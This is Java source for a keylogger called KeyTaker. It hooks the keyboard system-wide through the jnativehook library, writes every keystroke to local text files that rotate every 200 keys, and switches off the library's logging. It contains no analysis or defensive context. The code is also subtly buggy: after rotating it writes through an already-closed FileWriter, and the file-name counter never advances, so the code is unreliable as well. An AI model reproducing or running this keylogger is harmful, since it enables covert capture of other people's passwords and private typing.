import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Scanner;
import java.math.BigInteger;
import java.util.Random;

import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;

import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class KeyTaker implements NativeKeyListener {
	File file;
	
	// 2) FileWriter
	FileWriter fw;
	//3) PrintWriter
	//need to put fw outside of try catch 
	PrintWriter pw;
	Scanner sc;
	Random rnd = new Random();
	
	
	static int times = 0;
	BigInteger files = new BigInteger(30, rnd);
	
	//OPEN A FILE
	public KeyTaker() throws IOException {
		file = new File("Keys" + files.toString() + ".txt");
		file.createNewFile();
		// 2) FileWriter
		fw = null;
		try {
			fw = new FileWriter(file);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		//3) PrintWriter
		pw = new PrintWriter(fw);
		//need to put fw outside of try catch 
		sc = null;
		try {
			sc = new Scanner(file);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			
		}
	}
	
	public void nativeKeyPressed(NativeKeyEvent e) {
		String key = NativeKeyEvent.getKeyText(e.getKeyCode());
		//System.out.println("Key Pressed: " +key);

		pw.println(key);
			
		
		times++;
		if(times >= 200) {
			times = times%10;
			files.add(new BigInteger("1"));
			
			//closing scanner and filewriter
			try {
				fw.close();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			pw.close();
			sc.close();
			
			
			//setting up next file name and new file
			String name = "keys" + files + ".txt";
			file = new File(name);
			try {
				file.createNewFile();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			pw = new PrintWriter(fw);
			// setting up new FileWriter
			fw = null;
			try {
				fw = new FileWriter(file);
			} catch (IOException a) {
				// TODO Auto-generated catch block
				a.printStackTrace();
			}
			
			//New Scanner
			sc = null;
			try {
				sc = new Scanner(file);
			} catch (FileNotFoundException i) {
				// TODO Auto-generated catch block
				i.printStackTrace();	
			}
			
		}
			
			
		
		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            		try {
                		GlobalScreen.unregisterNativeHook();
            		} catch (NativeHookException nativeHookException) {
                		nativeHookException.printStackTrace();
            		}
            		pw.close();
            		
        }
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		//System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
	//	System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
	}

	public static void main(String[] args) throws IOException {
		
		// Clear previous logging configurations.
		LogManager.getLogManager().reset();

		// Get the logger for "org.jnativehook" and set the level to off.
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		try {
			GlobalScreen.registerNativeHook();
			
		}
		catch (NativeHookException ex) {
			
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}

		GlobalScreen.addNativeKeyListener(new KeyTaker());
	}
}